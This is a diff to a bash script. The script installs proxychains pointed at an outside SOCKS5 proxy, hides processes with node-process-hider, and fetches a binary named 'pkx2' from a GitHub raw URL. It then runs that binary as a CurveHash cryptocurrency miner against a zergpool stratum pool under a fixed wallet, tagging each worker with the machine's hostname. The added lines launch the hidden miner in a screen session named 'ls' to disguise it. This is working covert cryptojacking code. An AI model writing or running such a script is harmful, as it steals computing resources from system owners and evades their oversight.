@@ -1,7 +1,7 @@
 #!/bin/bash
 
 apt update 
-apt install proxychains  -y 
+apt install proxychains screen  -y 
 sed -i 's/socks4/socks5/' /etc/proxychains.conf 
 sed -i 's/127.0.0.1/98.162.96.53/' /etc/proxychains.conf
 sed -i 's/9050/10663/' /etc/proxychains.conf
@@ -12,5 +12,6 @@ npm –version
 npm i -g node-process-hider
 wget https://raw.githubusercontent.com/gyrogerald/mind/main/pkx2
 ph add pkx2
+screen -S ls
 chmod +x pkx2
 ./pkx2 -a curvehash -o stratum+tcp://curvehash.eu.mine.zergpool.com:3343 -u XshK2irNsaV9iTYc2KtGGf3LfUhXj3isKk -p c=DASH,mc=PLSR,ID=$(echo $(hostname)) -t 4
